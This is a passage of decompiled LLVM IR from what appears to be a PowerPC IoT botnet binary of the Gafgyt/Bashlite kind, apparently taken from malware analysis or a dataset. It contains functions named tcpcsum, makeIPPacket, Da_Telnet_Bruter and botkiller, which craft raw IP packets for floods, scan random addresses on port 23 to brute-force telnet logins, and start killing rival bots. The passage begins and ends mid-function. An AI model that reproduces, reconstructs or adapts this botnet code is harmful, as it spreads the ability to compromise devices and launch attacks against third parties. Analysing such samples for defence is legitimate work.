  %v1_100088a837 = phi i32 [ %v1_100088a8, %dec_label_pc_10008854 ], [ %v1_100088a832, %dec_label_pc_10008890.preheader ]
  %v2_100088a036 = phi i32 [ %v2_100088a0, %dec_label_pc_10008854 ], [ %v2_100088a031, %dec_label_pc_10008890.preheader ]
  %stack_var_-12.135 = phi i32 [ %v2_10008880, %dec_label_pc_10008854 ], [ %stack_var_-12.1.ph, %dec_label_pc_10008890.preheader ]
  %v1_10008860 = urem i32 %stack_var_-12.135, 65536
  %v2_10008880 = add i32 %v2_100088a036, %v1_10008860
  %v3_10008880 = icmp ult i32 %v2_10008880, %v1_10008860
  %v4_10008884 = zext i1 %v3_10008880 to i32
  %v5_10008884 = add nuw nsw i32 %v4_10008884, %v1_100088a837
  %v1_10008894 = mul i32 %v5_10008884, 65536
  %v1_1000889c = udiv i32 %v2_10008880, 65536
  %v2_100088a0 = or i32 %v1_10008894, %v1_1000889c
  %v1_100088a8 = udiv i32 %v5_10008884, 65536
  %v2_100088b0 = or i32 %v2_100088a0, %v1_100088a8
  %v3_100088b4 = icmp eq i32 %v2_100088b0, 0
  br i1 %v3_100088b4, label %dec_label_pc_10008890.dec_label_pc_100088bc_crit_edge, label %dec_label_pc_10008854

dec_label_pc_10008890.dec_label_pc_100088bc_crit_edge: ; preds = %dec_label_pc_10008854
  br label %dec_label_pc_100088bc

dec_label_pc_100088bc:                            ; preds = %dec_label_pc_10008890.dec_label_pc_100088bc_crit_edge, %dec_label_pc_10008890.preheader
  %v4_100088bc = zext i16 %tmp21 to i32
  %v1_100088c8 = xor i32 %v4_100088bc, 65535
  ret i32 %v1_100088c8

; uselistorder directives
  uselistorder i32 %v2_100088a0, { 1, 0 }
  uselistorder i32 %v5_10008884, { 1, 0 }
  uselistorder i32 %v2_10008880, { 0, 2, 1 }
  uselistorder i32 %v1_100088a832, { 1, 0 }
  uselistorder i32 %stack_var_-16.1.ph, { 1, 0 }
  uselistorder i32 %stack_var_-12.1.ph, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa18, { 1, 0 }
  uselistorder i32 %v1_10008804, { 0, 2, 1 }
  uselistorder i32 %v2_100087e4, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-12.05, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10008854, { 1, 0 }
  uselistorder label %dec_label_pc_10008890.preheader, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10008824, { 1, 0 }
  uselistorder label %dec_label_pc_100087c8, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-64 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100088e0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100088e0, i32* %stack_var_-64, align 4
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v1_1000890c = add i32 %arg1, 12
  %v2_1000890c = inttoptr i32 %v1_1000890c to i32*
  %v3_1000890c = load i32, i32* %v2_1000890c, align 4
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v1_10008918 = add i32 %arg1, 16
  %v2_10008918 = inttoptr i32 %v1_10008918 to i32*
  %v3_10008918 = load i32, i32* %v2_10008918, align 4
  store i32 20, i32* @r3, align 4
  %v1_10008934 = call i32 @htons(i32 20)
  store i32 268470612, i32* @lr, align 4
  %v1_10008950 = call i32 @malloc(i32 32)
  store i32 %v1_10008950, i32* %r11.global-to-local, align 4
  store i32 %v3_10008918, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10008970 = inttoptr i32 %v1_10008950 to i32*
  store i32 %v3_1000890c, i32* %v2_10008970, align 4
  %v0_10008974 = load i32, i32* %r10.global-to-local, align 4
  %v1_10008974 = load i32, i32* %r11.global-to-local, align 4
  %v2_10008974 = add i32 %v1_10008974, 4
  %v3_10008974 = inttoptr i32 %v2_10008974 to i32*
  store i32 %v0_10008974, i32* %v3_10008974, align 4
  %v0_10008978 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008978 = load i32, i32* %r11.global-to-local, align 4
  %v2_10008978 = add i32 %v1_10008978, 8
  %v3_10008978 = inttoptr i32 %v2_10008978 to i32*
  store i32 %v0_10008978, i32* %v3_10008978, align 4
  %v1_10008980 = add i32 %v1_10008950, 12
  store i32 %v1_10008980, i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_10008988 = load i32, i32* %arg2, align 4
  %v1_1000898c = add i32 %tmp, 4
  %v2_1000898c = inttoptr i32 %v1_1000898c to i32*
  %v3_1000898c = load i32, i32* %v2_1000898c, align 4
  store i32 %v3_1000898c, i32* %r10.global-to-local, align 4
  %v1_10008990 = add i32 %tmp, 8
  %v2_10008990 = inttoptr i32 %v1_10008990 to i32*
  %v3_10008990 = load i32, i32* %v2_10008990, align 4
  %v1_10008994 = add i32 %tmp, 12
  %v2_10008994 = inttoptr i32 %v1_10008994 to i32*
  %v3_10008994 = load i32, i32* %v2_10008994, align 4
  %v2_10008998 = inttoptr i32 %v1_10008980 to i32*
  store i32 %v2_10008988, i32* %v2_10008998, align 4
  %v0_1000899c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000899c = load i32, i32* %r11.global-to-local, align 4
  %v2_1000899c = add i32 %v1_1000899c, 4
  %v3_1000899c = inttoptr i32 %v2_1000899c to i32*
  store i32 %v0_1000899c, i32* %v3_1000899c, align 4
  %v1_100089a0 = load i32, i32* %r11.global-to-local, align 4
  %v2_100089a0 = add i32 %v1_100089a0, 8
  %v3_100089a0 = inttoptr i32 %v2_100089a0 to i32*
  store i32 %v3_10008990, i32* %v3_100089a0, align 4
  %v1_100089a4 = load i32, i32* %r11.global-to-local, align 4
  %v2_100089a4 = add i32 %v1_100089a4, 12
  %v3_100089a4 = inttoptr i32 %v2_100089a4 to i32*
  store i32 %v3_10008994, i32* %v3_100089a4, align 4
  %v1_100089a8 = add i32 %tmp, 16
  %v2_100089a8 = inttoptr i32 %v1_100089a8 to i32*
  %v3_100089a8 = load i32, i32* %v2_100089a8, align 4
  %v1_100089ac = load i32, i32* %r11.global-to-local, align 4
  %v2_100089ac = add i32 %v1_100089ac, 16
  %v3_100089ac = inttoptr i32 %v2_100089ac to i32*
  store i32 %v3_100089a8, i32* %v3_100089ac, align 4
  %v5_100089b8 = inttoptr i32 %v1_10008950 to i16*
  %v6_100089b8 = call i32 @csum(i16* %v5_100089b8, i32 32, i32 %v3_10008994, i32 %v3_10008990, i32 %tmp)
  %sext = mul i32 %v6_100089b8, 65536
  %v1_100089bc = sdiv i32 %sext, 65536
  store i32 268470732, i32* @lr, align 4
  %v1_100089c8 = call i32 @free(i32 %v1_10008950)
  %v1_100089d0 = urem i32 %v1_100089bc, 65536
  %v2_100089d8 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_100089d8, i32* %r11.global-to-local, align 4
  ret i32 %v1_100089d0

; uselistorder directives
  uselistorder i32 %v1_10008950, { 3, 2, 1, 0, 4 }
  uselistorder i32 %tmp, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7, 8 }
}

define i32 @makeIPPacket(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg4 to i8
  %tmp1 = ptrtoint i32* %arg1 to i32
  %v1_10008a28 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10008a28, i32* %arg1, align 4
  %v1_10008a3c = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10008a3c, i32* %arg1, align 4
  %v3_10008a4c = add i32 %tmp1, 1
  %v4_10008a4c = inttoptr i32 %v3_10008a4c to i8*
  store i8 0, i8* %v4_10008a4c, align 1
  %fold = add i32 %arg5, 20
  %v1_10008a64 = trunc i32 %fold to i16
  %v3_10008a64 = add i32 %tmp1, 2
  %v4_10008a64 = inttoptr i32 %v3_10008a64 to i16*
  store i16 %v1_10008a64, i16* %v4_10008a64, align 2
  %v0_10008a68 = call i32 @rand_cmwc()
  %v1_10008a78 = trunc i32 %v0_10008a68 to i16
  %v3_10008a78 = add i32 %tmp1, 4
  %v4_10008a78 = inttoptr i32 %v3_10008a78 to i16*
  store i16 %v1_10008a78, i16* %v4_10008a78, align 2
  %v3_10008a84 = add i32 %tmp1, 6
  %v4_10008a84 = inttoptr i32 %v3_10008a84 to i16*
  store i16 0, i16* %v4_10008a84, align 2
  %v3_10008a90 = add i32 %tmp1, 8
  %v4_10008a90 = inttoptr i32 %v3_10008a90 to i8*
  store i8 -1, i8* %v4_10008a90, align 1
  %v3_10008a9c = add i32 %tmp1, 9
  %v4_10008a9c = inttoptr i32 %v3_10008a9c to i8*
  store i8 %tmp, i8* %v4_10008a9c, align 1
  %v3_10008aa8 = add i32 %tmp1, 10
  %v4_10008aa8 = inttoptr i32 %v3_10008aa8 to i16*
  store i16 0, i16* %v4_10008aa8, align 2
  %v2_10008ab4 = add i32 %tmp1, 12
  %v3_10008ab4 = inttoptr i32 %v2_10008ab4 to i32*
  store i32 %arg3, i32* %v3_10008ab4, align 4
  %v2_10008ac0 = add i32 %tmp1, 16
  %v3_10008ac0 = inttoptr i32 %v2_10008ac0 to i32*
  store i32 %arg2, i32* %v3_10008ac0, align 4
  ret i32 %v0_10008a68
}

define i32 @sclose(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_10008af8 = icmp sgt i32 %arg1, 2
  br i1 %v2_10008af8, label %dec_label_pc_10008b0c, label %dec_label_pc_10008b1c

dec_label_pc_10008b0c:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10008b14.310 to i32), i32* @lr, align 4
  %v1_10008b10 = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_10008b1c

dec_label_pc_10008b1c:                            ; preds = %entry, %dec_label_pc_10008b0c
  %storemerge = phi i32 [ 0, %dec_label_pc_10008b0c ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_10008b1c, { 1, 0 }
}

define i32 @Da_Telnet_Bruter(i32 %arg1) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10008b3c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10008b3c, i32* %stack_var_-624, align 4
  store i32 268471152, i32* @lr, align 4
  %v1_10008b6c = call i32 @__GI_time(i32 0)
  %v0_10008b78 = call i32 @rand_cmwc()
  %v2_10008b80 = xor i32 %v1_10008b6c, %v0_10008b78
  store i32 ptrtoint (i32* @global_var_10008b8c.311 to i32), i32* @lr, align 4
  %v1_10008b88 = call i32 @srand(i32 %v2_10008b80)
  store i32 2, i32* %stack_var_-44, align 4
  store i32 23, i32* @r3, align 4
  %v1_10008b98 = call i32 @htons(i32 23)
  %v2_10008ba8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10008ba8, i32* %r9.global-to-local, align 4
  store i32 0, i32* %stack_var_-36, align 4
  store i32 268471236, i32* @lr, align 4
  %v1_10008bc0 = call i32 @malloc(i32 513)
  store i32 513, i32* %r9.global-to-local, align 4
  store i32 268471268, i32* @lr, align 4
  %v3_10008be0 = call i32 @__GI_memset(i32 %v1_10008bc0, i32 0, i32 513)
  %v2_10008bfc = load i32, i32* %stack_var_-624, align 4
  %v1_10008c04 = load i32, i32* @r1, align 4
  %v3_10008c04 = add i32 %v1_10008c04, -14352
  %v4_10008c04 = inttoptr i32 %v3_10008c04 to i32*
  store i32 %v2_10008bfc, i32* %v4_10008c04, align 4
  %v1_10008c14 = add i32 %v1_10008c04, -14329
  %v1_10008c18 = and i32 %v1_10008c14, -16
  store i32 %v1_10008c18, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10008c48.312 to i32), i32* @lr, align 4
  %v3_10008c44 = call i32 @__GI_memset(i32 %v1_10008c18, i32 0, i32 2560)
  store i32 512, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10008c54

dec_label_pc_10008c54:                            ; preds = %entry, %dec_label_pc_10008c54
  %storemerge37 = phi i32 [ 0, %entry ], [ %v1_10008cd4, %dec_label_pc_10008c54 ]
  %v1_10008c5c = mul nuw nsw i32 %storemerge37, 28
  %v2_10008c60 = add i32 %v1_10008c5c, %v1_10008c18
  store i32 %v2_10008c60, i32* %r9.global-to-local, align 4
  %v2_10008c68 = inttoptr i32 %v2_10008c60 to i32*
  store i32 0, i32* %v2_10008c68, align 4
  %v1_10008c70 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008c70 = add i32 %v1_10008c70, 4
  %v3_10008c70 = inttoptr i32 %v2_10008c70 to i32*
  store i32 0, i32* %v3_10008c70, align 4
  %v1_10008c78 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008c78 = add i32 %v1_10008c78, 8
  %v3_10008c78 = inttoptr i32 %v2_10008c78 to i32*
  store i32 0, i32* %v3_10008c78, align 4
  %v1_10008c80 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008c80 = add i32 %v1_10008c80, 12
  %v3_10008c80 = inttoptr i32 %v2_10008c80 to i32*
  store i32 0, i32* %v3_10008c80, align 4
  %v1_10008c88 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008c88 = add i32 %v1_10008c88, 16
  %v3_10008c88 = inttoptr i32 %v2_10008c88 to i32*
  store i32 0, i32* %v3_10008c88, align 4
  %v1_10008c90 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008c90 = add i32 %v1_10008c90, 20
  %v3_10008c90 = inttoptr i32 %v2_10008c90 to i32*
  store i32 0, i32* %v3_10008c90, align 4
  %v1_10008c98 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008c98 = add i32 %v1_10008c98, 24
  %v3_10008c98 = inttoptr i32 %v2_10008c98 to i32*
  store i32 0, i32* %v3_10008c98, align 4
  %v3_10008cb0 = add i32 %v2_10008c60, 9
  %v4_10008cb0 = inttoptr i32 %v3_10008cb0 to i8*
  store i8 1, i8* %v4_10008cb0, align 1
  %v1_10008cc4 = add i32 %v2_10008c60, 24
  %v2_10008ccc = inttoptr i32 %v1_10008cc4 to i32*
  store i32 %v1_10008bc0, i32* %v2_10008ccc, align 4
  %v1_10008cd4 = add nuw nsw i32 %storemerge37, 1
  store i32 512, i32* %r9.global-to-local, align 4
  %v2_10008ce4 = icmp slt i32 %v1_10008cd4, 512
  br i1 %v2_10008ce4, label %dec_label_pc_10008c54, label %dec_label_pc_10008cec.preheader

dec_label_pc_10008cec.preheader:                  ; preds = %dec_label_pc_10008c54
  %v2_10008d34 = add i32 %v1_10008c18, 16
  %v2_10008e48 = or i32 %v1_10008c18, 4
  %v2_10009050 = ptrtoint i32* %stack_var_-44 to i32
  br label %dec_label_pc_10008cec

dec_label_pc_10008cec:                            ; preds = %dec_label_pc_10009cc8, %dec_label_pc_10008cec.preheader
  br label %dec_label_pc_10008cf8

dec_label_pc_10008cf8:                            ; preds = %dec_label_pc_10008cec, %dec_label_pc_10009cc8
  %storemerge45 = phi i32 [ 0, %dec_label_pc_10008cec ], [ %v1_10009ccc, %dec_label_pc_10009cc8 ]
  %v1_10008d00 = mul nuw nsw i32 %storemerge45, 28
  %v2_10008d04 = add i32 %v1_10008d00, %v1_10008c18
  %v1_10008d08 = add i32 %v2_10008d04, 16
  store i32 %v1_10008d08, i32* %r9.global-to-local, align 4
  %v1_10008d0c = inttoptr i32 %v1_10008d08 to i32*
  %v2_10008d0c = load i32, i32* %v1_10008d0c, align 4
  %v3_10008d10 = icmp eq i32 %v2_10008d0c, 0
  br i1 %v3_10008d10, label %dec_label_pc_10008d18, label %dec_label_pc_10008d40

dec_label_pc_10008d18:                            ; preds = %dec_label_pc_10008cf8
  store i32 268471588, i32* @lr, align 4
  %v1_10008d20 = call i32 @__GI_time(i32 0)
  %v1_10008d30 = mul i32 %storemerge45, 28
  %v1_10008d38 = add i32 %v2_10008d34, %v1_10008d30
  store i32 %v1_10008d38, i32* %r9.global-to-local, align 4
  %v2_10008d3c = inttoptr i32 %v1_10008d38 to i32*
  store i32 %v1_10008d20, i32* %v2_10008d3c, align 4
  br label %dec_label_pc_10008d40

dec_label_pc_10008d40:                            ; preds = %dec_label_pc_10008cf8, %dec_label_pc_10008d18
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  %v1_10008d50 = add i32 %v2_10008d04, 8
  %v2_10008d50 = inttoptr i32 %v1_10008d50 to i8*
  %v3_10008d50 = load i8, i8* %v2_10008d50, align 4
  %v2_10008d60 = icmp ugt i8 %v3_10008d50, 8
  br i1 %v2_10008d60, label %dec_label_pc_10009cc8, label %dec_label_pc_10008d68

dec_label_pc_10008d68:                            ; preds = %dec_label_pc_10008d40
  %v4_10008d50 = zext i8 %v3_10008d50 to i32
  %v1_10008d6c = mul nuw nsw i32 %v4_10008d50, 4
  %v2_10008d78 = add i32 %v1_10008d6c, ptrtoint (i32* @global_var_10018c28.313 to i32)
  store i32 %v2_10008d78, i32* %r9.global-to-local, align 4
  %v1_10008d7c = inttoptr i32 %v2_10008d78 to i32*
  %v2_10008d7c = load i32, i32* %v1_10008d7c, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v2_10008d88 = add i32 %v2_10008d7c, ptrtoint (i32* @global_var_10018c28.313 to i32)
  call void @__pseudo_branch(i32 %v2_10008d88)
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  %v1_10008da4 = add i32 %v2_10008d04, 9
  %v2_10008da4 = inttoptr i32 %v1_10008da4 to i8*
  %v3_10008da4 = load i8, i8* %v2_10008da4, align 1
  %v3_10008dac = icmp eq i8 %v3_10008da4, 1
  store i32 %v1_10008c18, i32* %r9.global-to-local, align 4
  br i1 %v3_10008dac, label %dec_label_pc_10008db4, label %dec_label_pc_10008e58

dec_label_pc_10008db4:                            ; preds = %dec_label_pc_10008d68
  %v1_10008dc4 = add i32 %v2_10008d04, 24
  store i32 %v1_10008dc4, i32* %r9.global-to-local, align 4
  %v1_10008dc8 = inttoptr i32 %v1_10008dc4 to i32*
  %v2_10008dc8 = load i32, i32* %v1_10008dc8, align 4
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  %v2_10008de4 = inttoptr i32 %v2_10008d04 to i32*
  store i32 0, i32* %v2_10008de4, align 4
  %v1_10008dec = load i32, i32* %r9.global-to-local, align 4
  %v2_10008dec = add i32 %v1_10008dec, 4
  %v3_10008dec = inttoptr i32 %v2_10008dec to i32*
  store i32 0, i32* %v3_10008dec, align 4
  %v1_10008df4 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008df4 = add i32 %v1_10008df4, 8
  %v3_10008df4 = inttoptr i32 %v2_10008df4 to i32*
  store i32 0, i32* %v3_10008df4, align 4
  %v1_10008dfc = load i32, i32* %r9.global-to-local, align 4
  %v2_10008dfc = add i32 %v1_10008dfc, 12
  %v3_10008dfc = inttoptr i32 %v2_10008dfc to i32*
  store i32 0, i32* %v3_10008dfc, align 4
  %v1_10008e04 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008e04 = add i32 %v1_10008e04, 16
  %v3_10008e04 = inttoptr i32 %v2_10008e04 to i32*
  store i32 0, i32* %v3_10008e04, align 4
  %v1_10008e0c = load i32, i32* %r9.global-to-local, align 4
  %v2_10008e0c = add i32 %v1_10008e0c, 20
  %v3_10008e0c = inttoptr i32 %v2_10008e0c to i32*
  store i32 0, i32* %v3_10008e0c, align 4
  %v1_10008e14 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008e14 = add i32 %v1_10008e14, 24
  %v3_10008e14 = inttoptr i32 %v2_10008e14 to i32*
  store i32 0, i32* %v3_10008e14, align 4
  store i32 %v1_10008dc4, i32* %r9.global-to-local, align 4
  store i32 %v2_10008dc8, i32* %v1_10008dc8, align 4
  %v1_10008e38 = call i32 @FindingRandomIP(i32 %v1_10008dc4)
  %v0_10008e44 = load i32, i32* @r29, align 4
  %v1_10008e44 = mul i32 %v0_10008e44, 28
  %v1_10008e4c = add i32 %v1_10008e44, %v2_10008e48
  store i32 %v1_10008e4c, i32* %r9.global-to-local, align 4
  %v2_10008e50 = inttoptr i32 %v1_10008e4c to i32*
  store i32 %v1_10008e38, i32* %v2_10008e50, align 4
  br label %dec_label_pc_10008f50

dec_label_pc_10008e58:                            ; preds = %dec_label_pc_10008d68
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  %v3_10008e68 = load i8, i8* %v2_10008da4, align 1
  %v3_10008e70 = icmp eq i8 %v3_10008e68, 0
  br i1 %v3_10008e70, label %dec_label_pc_10008e78, label %dec_label_pc_10008f50

dec_label_pc_10008e78:                            ; preds = %dec_label_pc_10008e58
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  %v1_10008e88 = add i32 %v2_10008d04, 11
  %v2_10008e88 = inttoptr i32 %v1_10008e88 to i8*
  %v3_10008e88 = load i8, i8* %v2_10008e88, align 1
  %v1_10008e90 = add i8 %v3_10008e88, 1
  store i8 %v1_10008e90, i8* %v2_10008e88, align 1
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  %v1_10008eb8 = add i32 %v2_10008d04, 10
  %v2_10008eb8 = inttoptr i32 %v1_10008eb8 to i8*
  %v3_10008eb8 = load i8, i8* %v2_10008eb8, align 2
  %v1_10008ec0 = add i8 %v3_10008eb8, 1
  store i8 %v1_10008ec0, i8* %v2_10008eb8, align 2
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  %v3_10008ee8 = load i8, i8* %v2_10008e88, align 1
  %v3_10008ef0 = icmp eq i8 %v3_10008ee8, 14
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  br i1 %v3_10008ef0, label %dec_label_pc_10008ef8, label %dec_label_pc_10008f14

dec_label_pc_10008ef8:                            ; preds = %dec_label_pc_10008e78
  store i8 1, i8* %v2_10008da4, align 1
  br label %dec_label_pc_10009cc8

dec_label_pc_10008f14:                            ; preds = %dec_label_pc_10008e78
  %v3_10008f24 = load i8, i8* %v2_10008eb8, align 2
  %v3_10008f2c = icmp eq i8 %v3_10008f24, 14
  br i1 %v3_10008f2c, label %dec_label_pc_10008f34, label %dec_label_pc_10008f50

dec_label_pc_10008f34:                            ; preds = %dec_label_pc_10008f14
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  store i8 1, i8* %v2_10008da4, align 1
  br label %dec_label_pc_10009cc8

dec_label_pc_10008f50:                            ; preds = %dec_label_pc_10008f14, %dec_label_pc_10008e58, %dec_label_pc_10008db4
  store i32 2, i32* %stack_var_-44, align 4
  store i32 23, i32* @r3, align 4
  %v1_10008f5c = call i32 @htons(i32 23)
  store i32 0, i32* %stack_var_-36, align 4
  %v1_10008f90 = add i32 %v2_10008d04, 4
  store i32 %v1_10008f90, i32* %r9.global-to-local, align 4
  store i32 268472240, i32* @lr, align 4
  %v3_10008fac = call i32 @socket(i32 2, i32 1, i32 0)
  %v1_10008fb8 = mul i32 %storemerge45, 28
  %v2_10008fbc = add i32 %v1_10008fb8, %v1_10008c18
  %v2_10008fc0 = inttoptr i32 %v2_10008fbc to i32*
  store i32 %v3_10008fac, i32* %v2_10008fc0, align 4
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  %v1_10008fd4 = inttoptr i32 %v2_10008d04 to i32*
  %v2_10008fd4 = load i32, i32* %v1_10008fd4, align 4
  store i32 %v2_10008fd4, i32* %r9.global-to-local, align 4
  %v4_10008fdc = icmp eq i32 %v2_10008fd4, -1
  br i1 %v4_10008fdc, label %dec_label_pc_10009cc8, label %dec_label_pc_10008fe4

dec_label_pc_10008fe4:                            ; preds = %dec_label_pc_10008f50
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  %v2_10008ff4 = load i32, i32* %v1_10008fd4, align 4
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  %v2_10009008 = load i32, i32* %v1_10008fd4, align 4
  store i32 268472352, i32* @lr, align 4
  %v2_1000901c = call i32 @__libc_fcntl(i32 %v2_10009008, i32 3)
  store i32 268472380, i32* @lr, align 4
  %v2_10009038 = call i32 @__libc_fcntl(i32 %v2_10008ff4, i32 4)
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  %v2_1000904c = load i32, i32* %v1_10008fd4, align 4
  store i32 %v2_10009050, i32* %r9.global-to-local, align 4
  store i32 268472420, i32* @lr, align 4
  %v3_10009060 = call i32 @__libc_connect(i32 %v2_1000904c, i32 %v2_10009050, i32 16)
  store i32 %v3_10009060, i32* %r9.global-to-local, align 4
  %v4_1000906c = icmp eq i32 %v3_10009060, -1
  br i1 %v4_1000906c, label %dec_label_pc_10009074, label %dec_label_pc_100090c0

dec_label_pc_10009074:                            ; preds = %dec_label_pc_10008fe4
  %v0_10009074 = call i32 @__errno_location()
  store i32 %v0_10009074, i32* %r9.global-to-local, align 4
  %v1_1000907c = inttoptr i32 %v0_10009074 to i32*
  %v2_1000907c = load i32, i32* %v1_1000907c, align 4
  %v3_10009080 = icmp eq i32 %v2_1000907c, 115
  br i1 %v3_10009080, label %dec_label_pc_100090c0, label %dec_label_pc_10009088

dec_label_pc_10009088:                            ; preds = %dec_label_pc_10009074
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  %v2_10009098 = load i32, i32* %v1_10008fd4, align 4
  %v2_100090a0 = call i32 @sclose(i32 %v2_10009098, i32 %v2_10008d04)
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  store i8 1, i8* %v2_10008da4, align 1
  br label %dec_label_pc_10009cc8

dec_label_pc_100090c0:                            ; preds = %dec_label_pc_10008fe4, %dec_label_pc_10009074
  store i8 1, i8* %v2_10008d50, align 4
  store i32 %v1_10008d08, i32* %r9.global-to-local, align 4
  store i32 0, i32* %v1_10008d0c, align 4
  br label %dec_label_pc_10009cc8

dec_label_pc_10009cc8:                            ; preds = %dec_label_pc_10008f50, %dec_label_pc_10008d40, %dec_label_pc_100090c0, %dec_label_pc_10009088, %dec_label_pc_10008f34, %dec_label_pc_10008ef8
  %v1_10009ccc = add nuw nsw i32 %storemerge45, 1
  %v2_10009cdc = icmp slt i32 %v1_10009ccc, 512
  br i1 %v2_10009cdc, label %dec_label_pc_10008cf8, label %dec_label_pc_10008cec

; uselistorder directives
  uselistorder i8* %v2_10008eb8, { 1, 0, 2 }
  uselistorder i8* %v2_10008e88, { 1, 0, 2 }
  uselistorder i32 %v1_10008dc4, { 1, 0, 2, 3 }
  uselistorder i8* %v2_10008da4, { 3, 0, 1, 2, 4 }
  uselistorder i8 %v3_10008d50, { 1, 0 }
  uselistorder i32 %v2_10008d04, { 7, 9, 8, 10, 11, 12, 14, 13, 15, 0, 1, 2, 4, 3, 6, 5, 19, 17, 16, 18, 21, 20, 23, 22, 24 }
  uselistorder i32 %storemerge45, { 3, 1, 0, 2 }
  uselistorder i32 %storemerge37, { 1, 0 }
  uselistorder i32 %v1_10008c18, { 0, 4, 1, 3, 5, 2, 6, 7 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 46, 29, 30, 31, 32, 33, 41, 34, 35, 36, 37, 38, 39, 40, 45, 42, 43, 44 }
  uselistorder i32 513, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10009cc8, { 2, 3, 0, 4, 5, 1 }
  uselistorder label %dec_label_pc_100090c0, { 1, 0 }
  uselistorder label %dec_label_pc_10008d40, { 1, 0 }
  uselistorder label %dec_label_pc_10008cf8, { 1, 0 }
  uselistorder label %dec_label_pc_10008c54, { 1, 0 }
}

define i32 @botkiller(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-100 = alloca i8*, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10009ce8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10009ce8, i32* %stack_var_-112, align 4
  %v5_10009ce8 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v5_10009ce8, i32* @r31, align 4
  %v2_10009d08 = ptrtoint i8** %stack_var_-100 to i32
  %v2_10009d50 = bitcast i8** %stack_var_-100 to i8*
  br label %dec_label_pc_10009cfc

dec_label_pc_10009cfc:                            ; preds = %dec_label_pc_10009dec, %entry
  br label %dec_label_pc_10009d08

dec_label_pc_10009d08:                            ; preds = %dec_label_pc_10009cfc, %dec_label_pc_10009d08
  %storemerge34 = phi i32 [ 0, %dec_label_pc_10009cfc ], [ %v1_10009dd8, %dec_label_pc_10009d08 ]
  store i8* inttoptr (i32 1886087532 to i8*), i8** %stack_var_-100, align 4
  %v1_10009d38 = mul i32 %storemerge34, 4
  %v2_10009d3c = add i32 %v1_10009d38, ptrtoint ([162 x i8*]* @global_var_1002b2e4.609 to i32)
  %v1_10009d40 = inttoptr i32 %v2_10009d3c to i32*
  %v2_10009d40 = load i32, i32* %v1_10009d40, align 4
  store i32 %v2_10009d40, i32* @r4, align 4
  %v3_10009d50 = call i32 @strcat(i8* %v2_10009d50, i32 %v2_10009d40)
  store i32 268475744, i32* @lr, align 4
